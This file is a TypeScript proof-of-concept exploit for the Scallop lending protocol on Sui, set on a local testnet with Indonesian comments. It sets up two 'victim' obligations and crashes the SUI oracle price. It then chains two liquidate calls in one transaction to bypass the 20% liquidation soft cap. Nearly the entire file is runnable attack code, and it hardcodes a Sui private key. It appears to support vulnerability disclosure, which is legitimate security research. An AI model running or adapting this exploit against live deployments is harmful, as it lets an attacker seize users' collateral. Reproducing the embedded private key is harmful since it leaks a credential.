// @ts-nocheck
/**
 * PoC: Multi-Call Liquidation Bypasses 20% Soft Cap
 * Target: Scallop Protocol (Local Testnet)
 * SDK: @mysten/sui (Official)
 */

import { SuiClient } from '@mysten/sui/client';
import { Transaction } from '@mysten/sui/transactions';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { decodeSuiPrivateKey } from '@mysten/sui/cryptography';

const client = new SuiClient({ url: 'http://127.0.0.1:9000' });

// ==================== KONFIGURASI LOCAL TESTNET (ID TERBARU) ====================
const PKG = "0x45eea630bee5b96e69bca55a91e966f3a4fd505a58ba1eeabe9c8130b182f03a";
const VERSION = "0x784ccd439da54bd1a2ac5acb68018c797a322cd7343defafee774da51f6d4ffa";
const MARKET = "0x275f1139573a90c477663f30862bfd440d111f9945ea6dba6c835364536da273";
const ORACLE = "0x2be98d4de4bfc8ef84348d6260846a2cf99f0c5a695bc7f985bceb7302af4ffb";
const REGISTRY = "0x51b304750507ad83635fc99f1972b4b7fd17f98fb7b16f8890b6d16478378980";
const CLOCK = "0x6";

const TEST_COIN_PKG = "0x6a6cd3d02dbffdb452db911aad9f247a04f4c146a44a8109d225696bc1bf1f20";
const USDC_TYPE = `${TEST_COIN_PKG}::usdc::USDC`;
const ETH_TYPE = `${TEST_COIN_PKG}::eth::ETH`;
const SUI_TYPE = "0x2::sui::SUI";

const USDC_TREASURY = "0x0d9ed76c194c8adaf4dc3122087d7e067bd85e29f8b418b73f52138f1c278129";
const ETH_TREASURY = "0x6965c96d2b5c330b3964aefe3540d59111099cdd8f18a69e779e98074f07ab40";

const funderPrivateKeyStr = "suiprivkey1qzuxayfjwjmrqat03vkjh5nrt66fp4utywud2x8v0k0a6fg453yg7j2kcaa";
const privateKeyBytes = decodeSuiPrivateKey(funderPrivateKeyStr).secretKey;
const funderKeypair = Ed25519Keypair.fromSecretKey(privateKeyBytes);
const funderAddress = funderKeypair.getPublicKey().toSuiAddress();

console.log(`[INIT] Funder Address: ${funderAddress}`);

// ==================== HELPER FUNCTIONS ====================

async function findAdminCap(): Promise<string> {
    console.log("[INIT] Searching for AdminCap...");
    let cursor = null;
    while (true) {
        const objects = await client.getOwnedObjects({
            owner: funderAddress, cursor, options: { showType: true },
        });
        for (const obj of objects.data) {
            if ((obj.data?.type || "").includes(`${PKG}::app::AdminCap`)) {
                console.log(`[INIT] AdminCap found: ${obj.data.objectId}`);
                return obj.data.objectId;
            }
        }
        if (!objects.hasNextPage) break;
        cursor = objects.nextCursor;
    }
    throw new Error("AdminCap not found.");
}

async function findCoinMetadata(coinType: string): Promise<string> {
    const response = await client.getCoinMetadata({ coinType });
    if (!response) throw new Error(`CoinMetadata not found for ${coinType}`);
    return response.id;
}

async function getXOraclePackage(): Promise<string> {
    const obj = await client.getObject({ id: ORACLE, options: { showType: true } });
    const match = obj.data?.type?.match(/^(0x[0-9a-fA-F]+)::/);
    if (!match) throw new Error("Failed to parse XOracle package ID");
    return match[1];
}

async function executeTx(tx, keypair) {
    tx.setSender(keypair.getPublicKey().toSuiAddress());
    const result = await client.signAndExecuteTransaction({
        signer: keypair, transaction: tx,
        options: { showEffects: true, showObjectChanges: true },
    });
    if (result.effects.status.status !== 'success') {
        console.error("[ERROR] Transaction Failed!", JSON.stringify(result.effects, null, 2));
        throw new Error(`Transaction failed: ${result.effects.status.error}`);
    }
    await new Promise(r => setTimeout(r, 1500));
    return result;
}

function updatePrices(tx, xOraclePkg, suiPrice, usdcPrice, ethPrice) {
    tx.moveCall({
        target: `${xOraclePkg}::x_oracle::update_price`,
        typeArguments: [SUI_TYPE],
        arguments: [tx.object(ORACLE), tx.object(CLOCK), tx.pure.u64(suiPrice)],
    });
    tx.moveCall({
        target: `${xOraclePkg}::x_oracle::update_price`,
        typeArguments: [USDC_TYPE],
        arguments: [tx.object(ORACLE), tx.object(CLOCK), tx.pure.u64(usdcPrice)],
    });
    tx.moveCall({
        target: `${xOraclePkg}::x_oracle::update_price`,
        typeArguments: [ETH_TYPE],
        arguments: [tx.object(ORACLE), tx.object(CLOCK), tx.pure.u64(ethPrice)],
    });
}

async function printBalances(address) {
    const suiBalance = await client.getBalance({ owner: address, coinType: SUI_TYPE });
    const usdcBalance = await client.getBalance({ owner: address, coinType: USDC_TYPE });
    const ethBalance = await client.getBalance({ owner: address, coinType: ETH_TYPE });
    console.log(
        `[DEBUG] Balances for ${address.slice(0, 8)}...: ` +
        `SUI=${Number(suiBalance.totalBalance) / 1e9} | ` +
        `USDC=${Number(usdcBalance.totalBalance) / 1e9} | ` +
        `ETH=${Number(ethBalance.totalBalance) / 1e9}`
    );
}

// PERBAIKAN: Menelusuri WitTable -> Table -> Dynamic Field untuk membaca Collateral & Debt
async function readObligationState(obligationId) {
    let collateralAmount = 0n, debtUSDC = 0n, debtETH = 0n;

    try {
        // 1. Dapatkan ID WitTable untuk Collaterals dan Debts dari Obligation
        const obFields = await client.getDynamicFields({ parentId: obligationId });
        let collateralsWitTableId = "";
        let debtsWitTableId = "";

        for (const f of obFields.data) {
            if (f.objectType.includes("wit_table::WitTable")) {
                if (f.objectType.includes("Collateral")) collateralsWitTableId = f.objectId;
                if (f.objectType.includes("Debt")) debtsWitTableId = f.objectId;
            }
        }

        // 2. Baca Collateral SUI
        if (collateralsWitTableId) {
            const witTableFields = await client.getDynamicFields({ parentId: collateralsWitTableId });
            let collTableId = "";
            for (const f of witTableFields.data) {
                if (f.objectType.includes("sui::table::Table")) {
                    collTableId = f.objectId;
                    break;
                }
            }

            if (collTableId) {
                const tableFields = await client.getDynamicFields({ parentId: collTableId });
                for (const f of tableFields.data) {
                    const fieldData = await client.getDynamicFieldObject({ parentId: collTableId, name: f.name });
                    const fieldValue = fieldData?.data?.content?.fields?.value;
                    const amount = BigInt(fieldValue?.fields?.amount || fieldValue?.amount || 0);
                    const nameStr = JSON.stringify(f.name).toLowerCase();
                    
                    if (nameStr.includes("sui")) collateralAmount = amount;
                }
            }
        }

        // 3. Baca Debt USDC & ETH
        if (debtsWitTableId) {
            const witTableFields = await client.getDynamicFields({ parentId: debtsWitTableId });
            let debtTableId = "";
            for (const f of witTableFields.data) {
                if (f.objectType.includes("sui::table::Table")) {
                    debtTableId = f.objectId;
                    break;
                }
            }

            if (debtTableId) {
                const tableFields = await client.getDynamicFields({ parentId: debtTableId });
                for (const f of tableFields.data) {
                    const fieldData = await client.getDynamicFieldObject({ parentId: debtTableId, name: f.name });
                    const fieldValue = fieldData?.data?.content?.fields?.value;
                    const amount = BigInt(fieldValue?.fields?.amount || fieldValue?.amount || 0);
                    const nameStr = JSON.stringify(f.name).toLowerCase();
                    
                    if (nameStr.includes("usdc")) debtUSDC = amount;
                    else if (nameStr.includes("eth")) debtETH = amount;
                }
            }
        }
    } catch (e) {
        console.error("Error reading obligation state:", e);
    }

    return { collateralAmount, debtUSDC, debtETH };
}

// ==================== PHASE 0: INITIALIZE MARKET ====================
async function initializeMarket(adminCapId) {
    console.log("\n[INIT] Initializing Market (Whitelist, Models, Oracle, APM)...");
    const suiMetaId = await findCoinMetadata(SUI_TYPE);
    const usdcMetaId = await findCoinMetadata(USDC_TYPE);
    const ethMetaId = await findCoinMetadata(ETH_TYPE);

    const tx = new Transaction();
    tx.moveCall({ target: `${PKG}::app::whitelist_allow_all`, arguments: [tx.object(adminCapId), tx.object(MARKET)] });
    tx.moveCall({ target: `${PKG}::app::init_market_coin_price_table`, arguments: [tx.object(adminCapId), tx.object(MARKET)] });

    const SCALE = 10n ** 12n;
    const addInterestModel = (coinType, p) => {
        const [modelChange] = tx.moveCall({
            target: `${PKG}::app::create_interest_model_change`, typeArguments: [coinType],
            arguments: [tx.object(adminCapId), tx.pure.u64(p.baseBorrowRatePerSec), tx.pure.u64(p.interestRateScale), tx.pure.u64(p.borrowRateOnMidKink), tx.pure.u64(p.midKink), tx.pure.u64(p.borrowRateOnHighKink), tx.pure.u64(p.highKink), tx.pure.u64(p.maxBorrowRate), tx.pure.u64(p.revenueFactor), tx.pure.u64(p.borrowWeight), tx.pure.u64(p.scale), tx.pure.u64(p.minBorrowAmount)],
        });
        tx.moveCall({ target: `${PKG}::app::add_interest_model`, typeArguments: [coinType], arguments: [tx.object(MARKET), tx.object(adminCapId), modelChange, tx.object(CLOCK)] });
    };
    const addRiskModel = (coinType, p) => {
        const [modelChange] = tx.moveCall({
            target: `${PKG}::app::create_risk_model_change`, typeArguments: [coinType],
            arguments: [tx.object(adminCapId), tx.pure.u64(p.collateralFactor), tx.pure.u64(p.liquidationFactor), tx.pure.u64(p.liquidationPanelty), tx.pure.u64(p.liquidationDiscount), tx.pure.u64(p.scale), tx.pure.u64(p.maxCollateralAmount)],
        });
        tx.moveCall({ target: `${PKG}::app::add_risk_model`, typeArguments: [coinType], arguments: [tx.object(MARKET), tx.object(adminCapId), modelChange] });
    };
    const addLimiter = (coinType, limit, cycle, segment) => tx.moveCall({ target: `${PKG}::app::add_limiter`, typeArguments: [coinType], arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(limit), tx.pure.u32(cycle), tx.pure.u32(segment)] });
    const registerDecimals = (coinType, metadataId) => tx.moveCall({ target: `${PKG}::coin_decimals_registry::register_decimals`, typeArguments: [coinType], arguments: [tx.object(REGISTRY), tx.object(metadataId)] });
    const setMinCollateral = (coinType, amount) => tx.moveCall({ target: `${PKG}::app::update_min_collateral_amount`, typeArguments: [coinType], arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(amount)] });
    const setSupplyLimit = (coinType, limit) => tx.moveCall({ target: `${PKG}::app::update_supply_limit`, typeArguments: [coinType], arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(limit)] });
    const setBorrowLimit = (coinType, limit) => tx.moveCall({ target: `${PKG}::app::update_borrow_limit`, typeArguments: [coinType], arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(limit)] });
    const setBorrowFee = (coinType, n, d) => tx.moveCall({ target: `${PKG}::app::update_borrow_fee`, typeArguments: [coinType], arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(n), tx.pure.u64(d)] });
    const setApmThreshold = (coinType, t) => tx.moveCall({ target: `${PKG}::app::set_apm_threshold`, typeArguments: [coinType], arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(t)] });

    // SUI
    registerDecimals(SUI_TYPE, suiMetaId);
    addInterestModel(SUI_TYPE, { baseBorrowRatePerSec: 0n, interestRateScale: 10n ** 7n, borrowRateOnMidKink: 10n * (SCALE / 100n), midKink: 60n * (SCALE / 100n), borrowRateOnHighKink: 100n * (SCALE / 100n), highKink: 90n * (SCALE / 100n), maxBorrowRate: 300n * (SCALE / 100n), revenueFactor: 5n * (SCALE / 100n), borrowWeight: 125n * (SCALE / 100n), scale: SCALE, minBorrowAmount: 10n ** 7n });
    addRiskModel(SUI_TYPE, { collateralFactor: 60n, liquidationFactor: 70n, liquidationPanelty: 10n, liquidationDiscount: 7n, scale: 100n, maxCollateralAmount: 10n ** 17n });
    addLimiter(SUI_TYPE, 10n ** 15n, 86400, 1800);
    setMinCollateral(SUI_TYPE, 0n); setSupplyLimit(SUI_TYPE, 10n ** 18n); setBorrowLimit(SUI_TYPE, 10n ** 18n); setBorrowFee(SUI_TYPE, 0n, 1n);
    setApmThreshold(SUI_TYPE, 1000n);

    // USDC
    registerDecimals(USDC_TYPE, usdcMetaId);
    addInterestModel(USDC_TYPE, { baseBorrowRatePerSec: 0n, interestRateScale: 10n ** 7n, borrowRateOnMidKink: 8n * (SCALE / 100n), midKink: 60n * (SCALE / 100n), borrowRateOnHighKink: 50n * (SCALE / 100n), highKink: 90n * (SCALE / 100n), maxBorrowRate: 150n * (SCALE / 100n), revenueFactor: 5n * (SCALE / 100n), borrowWeight: 100n * (SCALE / 100n), scale: SCALE, minBorrowAmount: 10n ** 7n });
    addRiskModel(USDC_TYPE, { collateralFactor: 90n, liquidationFactor: 95n, liquidationPanelty: 3n, liquidationDiscount: 2n, scale: 100n, maxCollateralAmount: 10n ** 17n });
    addLimiter(USDC_TYPE, 10n ** 15n, 86400, 1800);
    setMinCollateral(USDC_TYPE, 0n); setSupplyLimit(USDC_TYPE, 10n ** 18n); setBorrowLimit(USDC_TYPE, 10n ** 18n); setBorrowFee(USDC_TYPE, 0n, 1n);
    setApmThreshold(USDC_TYPE, 1000n);

    // ETH
    registerDecimals(ETH_TYPE, ethMetaId);
    addInterestModel(ETH_TYPE, { baseBorrowRatePerSec: 0n, interestRateScale: 10n ** 7n, borrowRateOnMidKink: 10n * (SCALE / 100n), midKink: 60n * (SCALE / 100n), borrowRateOnHighKink: 100n * (SCALE / 100n), highKink: 90n * (SCALE / 100n), maxBorrowRate: 300n * (SCALE / 100n), revenueFactor: 5n * (SCALE / 100n), borrowWeight: 100n * (SCALE / 100n), scale: SCALE, minBorrowAmount: 10n ** 7n });
    addRiskModel(ETH_TYPE, { collateralFactor: 80n, liquidationFactor: 90n, liquidationPanelty: 8n, liquidationDiscount: 5n, scale: 100n, maxCollateralAmount: 10n ** 16n });
    addLimiter(ETH_TYPE, 10n ** 15n, 86400, 1800);
    setMinCollateral(ETH_TYPE, 0n); setSupplyLimit(ETH_TYPE, 10n ** 18n); setBorrowLimit(ETH_TYPE, 10n ** 18n); setBorrowFee(ETH_TYPE, 0n, 1n);
    setApmThreshold(ETH_TYPE, 1000n);

    await executeTx(tx, funderKeypair);
    console.log("[INIT] Market initialized successfully!");
}

// ==================== PHASE 1: SETUP VICTIM ====================
async function setupVictim(victimKeypair, label, adminCapId, xOraclePkg) {
    const victimAddr = victimKeypair.getPublicKey().toSuiAddress();
    console.log(`\n[${label}] Setting up victim at ${victimAddr}...`);

    const fundTx = new Transaction();
    const [suiCoin] = fundTx.splitCoins(fundTx.gas, [1_010_000_000_000n]);
    fundTx.transferObjects([suiCoin], victimAddr);
    await executeTx(fundTx, funderKeypair);
    console.log(`[${label}] Step 1 done: Funded victim with 1010 SUI`);

    const openTx = new Transaction();
    openTx.moveCall({ target: `${PKG}::open_obligation::open_obligation_entry`, arguments: [openTx.object(VERSION)] });
    const openResult = await executeTx(openTx, victimKeypair);
    
    let obligationId = "", obligationKeyId = "";
    for (const obj of openResult.objectChanges || []) {
        if (obj.type === "created" && obj.objectType?.includes("obligation::ObligationKey")) obligationKeyId = obj.objectId;
        else if (obj.type === "created" && obj.objectType?.includes("obligation::Obligation")) obligationId = obj.objectId;
    }
    if (!obligationId || !obligationKeyId) throw new Error(`[${label}] Failed to parse obligationId.`);

    console.log(`[${label}] Obligation ID:    ${obligationId}`);
    console.log(`[${label}] ObligationKey ID: ${obligationKeyId}`);

    const whitelistTx = new Transaction();
    whitelistTx.moveCall({ target: `${PKG}::app::add_whitelist_address`, arguments: [whitelistTx.object(adminCapId), whitelistTx.object(MARKET), whitelistTx.pure.address(victimAddr)] });
    await executeTx(whitelistTx, funderKeypair);

    const depositTx = new Transaction();
    const [collateralCoin] = depositTx.splitCoins(depositTx.gas, [1_000_000_000_000n]);
    depositTx.moveCall({ target: `${PKG}::deposit_collateral::deposit_collateral`, typeArguments: [SUI_TYPE], arguments: [depositTx.object(VERSION), depositTx.object(obligationId), depositTx.object(MARKET), collateralCoin] });
    await executeTx(depositTx, victimKeypair);
    console.log(`[${label}] Step 3 done: Deposited 1000 SUI collateral`);

    const supplyTx = new Transaction();
    const [usdcCoin] = supplyTx.moveCall({ target: `${TEST_COIN_PKG}::usdc::mint`, arguments: [supplyTx.object(USDC_TREASURY), supplyTx.pure.u64(100_000_000_000_000n)] });
    const [sUSDC] = supplyTx.moveCall({ target: `${PKG}::mint::mint`, typeArguments: [USDC_TYPE], arguments: [supplyTx.object(VERSION), supplyTx.object(MARKET), usdcCoin, supplyTx.object(CLOCK)] });
    supplyTx.transferObjects([sUSDC], funderAddress);
    const [ethCoin] = supplyTx.moveCall({ target: `${TEST_COIN_PKG}::eth::mint`, arguments: [supplyTx.object(ETH_TREASURY), supplyTx.pure.u64(10_000_000_000n)] });
    const [sETH] = supplyTx.moveCall({ target: `${PKG}::mint::mint`, typeArguments: [ETH_TYPE], arguments: [supplyTx.object(VERSION), supplyTx.object(MARKET), ethCoin, supplyTx.object(CLOCK)] });
    supplyTx.transferObjects([sETH], funderAddress);
    await executeTx(supplyTx, funderKeypair);
    console.log(`[${label}] Step 4 done: Minted and supplied USDC and ETH to market`);

    const borrowUSDCTx = new Transaction();
    updatePrices(borrowUSDCTx, xOraclePkg, 1_000_000_000n, 1_000_000_000n, 2_000_000_000_000n);
    borrowUSDCTx.moveCall({ target: `${PKG}::apm::refresh_apm_state`, typeArguments: [SUI_TYPE], arguments: [borrowUSDCTx.object(VERSION), borrowUSDCTx.object(MARKET), borrowUSDCTx.object(ORACLE), borrowUSDCTx.object(CLOCK)] });

    const [borrowedUSDC] = borrowUSDCTx.moveCall({
        target: `${PKG}::borrow::borrow`, typeArguments: [USDC_TYPE],
        arguments: [borrowUSDCTx.object(VERSION), borrowUSDCTx.object(obligationId), borrowUSDCTx.object(obligationKeyId), borrowUSDCTx.object(MARKET), borrowUSDCTx.object(REGISTRY), borrowUSDCTx.pure.u64(300_000_000_000n), borrowUSDCTx.object(ORACLE), borrowUSDCTx.object(CLOCK)],
    });
    borrowUSDCTx.transferObjects([borrowedUSDC], victimAddr);
    await executeTx(borrowUSDCTx, victimKeypair);
    console.log(`[${label}] Step 5 done: Borrowed 300 USDC`);

    const borrowETHTx = new Transaction();
    updatePrices(borrowETHTx, xOraclePkg, 1_000_000_000n, 1_000_000_000n, 2_000_000_000_000n);
    borrowETHTx.moveCall({ target: `${PKG}::apm::refresh_apm_state`, typeArguments: [SUI_TYPE], arguments: [borrowETHTx.object(VERSION), borrowETHTx.object(MARKET), borrowETHTx.object(ORACLE), borrowETHTx.object(CLOCK)] });

    const [borrowedETH] = borrowETHTx.moveCall({
        target: `${PKG}::borrow::borrow`, typeArguments: [ETH_TYPE],
        arguments: [borrowETHTx.object(VERSION), borrowETHTx.object(obligationId), borrowETHTx.object(obligationKeyId), borrowETHTx.object(MARKET), borrowETHTx.object(REGISTRY), borrowETHTx.pure.u64(100_000_000n), borrowETHTx.object(ORACLE), borrowETHTx.object(CLOCK)],
    });
    borrowETHTx.transferObjects([borrowedETH], victimAddr);
    await executeTx(borrowETHTx, victimKeypair);
    console.log(`[${label}] Step 6 done: Borrowed 0.1 ETH`);

    console.log(`[${label}] Setup complete. Obligation ID: ${obligationId}`);
    return { obligationId, obligationKeyId };
}

// ==================== PHASE 2: TRIGGER (MANIPULASI ORACLE) ====================
async function crashOraclePrice(xOraclePkg) {
    console.log("\n[TRIGGER] Crashing SUI price to $0.40 via Oracle Update...");
    const tx = new Transaction();
    updatePrices(tx, xOraclePkg, 400_000_000n, 1_000_000_000n, 2_000_000_000_000n);
    await executeTx(tx, funderKeypair);
    console.log("[TRIGGER] SUI price crashed. Victims are now UNHEALTHY!");
}

// ==================== PHASE 3: BEFORE EXPLOIT (Single Call) ====================
async function beforeExploit_singleCall(victimObligationId, xOraclePkg) {
    console.log("\n" + "=".repeat(60));
    console.log("BEFORE EXPLOIT: Single Liquidation Call");
    console.log("=".repeat(60));

    const stateBefore = await readObligationState(victimObligationId);
    console.log(`[BEFORE] Collateral SUI: ${stateBefore.collateralAmount / 1_000_000_000n}`);

    const tx = new Transaction();
    updatePrices(tx, xOraclePkg, 400_000_000n, 1_000_000_000n, 2_000_000_000_000n);

    const [repayUSDC] = tx.moveCall({
        target: `${TEST_COIN_PKG}::usdc::mint`,
        arguments: [tx.object(USDC_TREASURY), tx.pure.u64(100_000_000_000n)],
    });

    const [remainUSDC, collateralCoin] = tx.moveCall({
        target: `${PKG}::liquidate::liquidate`,
        typeArguments: [USDC_TYPE, SUI_TYPE],
        arguments: [tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), repayUSDC, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)],
    });

    tx.transferObjects([remainUSDC, collateralCoin], funderAddress);

    await executeTx(tx, funderKeypair);
    const stateAfter = await readObligationState(victimObligationId);

    const extracted = stateBefore.collateralAmount - stateAfter.collateralAmount;
    console.log(`[BEFORE] Single-call extracted: ${extracted / 1_000_000_000n} SUI (Expected: ~20% cap)`);
    return { extracted };
}

// ==================== PHASE 4: AFTER EXPLOIT (Multi Call) ====================
async function afterExploit_multiCall(victimObligationId, xOraclePkg) {
    console.log("\n" + "=".repeat(60));
    console.log("AFTER EXPLOIT: Multi-Call Liquidation");
    console.log("=".repeat(60));

    const stateBefore = await readObligationState(victimObligationId);

    const tx = new Transaction();
    updatePrices(tx, xOraclePkg, 400_000_000n, 1_000_000_000n, 2_000_000_000_000n);

    const [repayUSDC1] = tx.moveCall({
        target: `${TEST_COIN_PKG}::usdc::mint`,
        arguments: [tx.object(USDC_TREASURY), tx.pure.u64(100_000_000_000n)],
    });
    const [repayETH1] = tx.moveCall({
        target: `${TEST_COIN_PKG}::eth::mint`,
        arguments: [tx.object(ETH_TREASURY), tx.pure.u64(50_000_000n)],
    });

    const [rem1, c1] = tx.moveCall({
        target: `${PKG}::liquidate::liquidate`,
        typeArguments: [USDC_TYPE, SUI_TYPE],
        arguments: [tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), repayUSDC1, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)],
    });

    const [rem2, c2] = tx.moveCall({
        target: `${PKG}::liquidate::liquidate`,
        typeArguments: [ETH_TYPE, SUI_TYPE],
        arguments: [tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), repayETH1, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)],
    });

    tx.mergeCoins(c1, [c2]);
    tx.transferObjects([rem1, rem2, c1], funderAddress);

    await executeTx(tx, funderKeypair);
    const stateAfter = await readObligationState(victimObligationId);

    const extracted = stateBefore.collateralAmount - stateAfter.collateralAmount;
    console.log(`[AFTER] Multi-call extracted: ${extracted / 1_000_000_000n} SUI (BYPASSED 20% cap!)`);
    return { extracted };
}

// ==================== MAIN EXECUTION ====================
async function main() {
    console.log("╔═══════════════════════════════════════════════════════════╗");
    console.log("║  PoC: Multi-Call Liquidation Bypass (Local Testnet)       ║");
    console.log("╚═══════════════════════════════════════════════════════════╝");

    console.log("\n[DEBUG] Checking Funder Balances...");
    await printBalances(funderAddress);

    const adminCapId = await findAdminCap();
    const xOraclePkg = await getXOraclePackage();

    await initializeMarket(adminCapId);

    const victimA = Ed25519Keypair.generate();
    const victimB = Ed25519Keypair.generate();

    const vA = await setupVictim(victimA, "VICTIM A", adminCapId, xOraclePkg);
    const vB = await setupVictim(victimB, "VICTIM B", adminCapId, xOraclePkg);

    await crashOraclePrice(xOraclePkg);

    console.log("\n[DEBUG] Checking Funder Balances before Exploits...");
    await printBalances(funderAddress);

    const beforeResult = await beforeExploit_singleCall(vA.obligationId, xOraclePkg);
    const afterResult = await afterExploit_multiCall(vB.obligationId, xOraclePkg);

    console.log("\n[DEBUG] Checking Funder Balances AFTER Exploits...");
    await printBalances(funderAddress);

    console.log("\n" + "=".repeat(60));
    console.log("FINAL IMPACT ANALYSIS");
    console.log("=".repeat(60));
    console.log(`Single-Call Extracted : ${beforeResult.extracted / 1_000_000_000n} SUI`);
    console.log(`Multi-Call Extracted  : ${afterResult.extracted / 1_000_000_000n} SUI`);

    if (beforeResult.extracted > 0n) {
        const ratio = Number(afterResult.extracted) / Number(beforeResult.extracted);
        console.log(`\n[IMPACT] Multi-Call extracted ${ratio.toFixed(2)}x MORE collateral!`);
    }
    console.log(`[IMPACT] 20% Soft Cap was BYPASSED via Multi-Call in single PTB!`);
}

main().catch(console.error);
